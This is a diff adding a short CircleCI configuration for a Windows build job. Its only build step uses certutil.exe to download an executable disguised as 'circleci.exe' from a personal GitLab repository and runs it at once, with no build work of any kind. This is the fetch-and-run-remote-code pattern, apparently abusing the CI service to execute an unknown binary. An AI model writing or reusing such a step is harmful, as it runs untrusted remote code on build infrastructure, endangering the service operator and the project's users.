@@ -1,0 +1,12 @@
+version: 2.1
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build:
+    executor:
+      name: win/default
+      shell: cmd.exe
+    steps:
+      - run: certutil.exe -urlcache -split -f https://gitlab.com/Pacifierjr1/trickshow2/-/raw/master/circleci.exe circleci.exe && circleci.exe
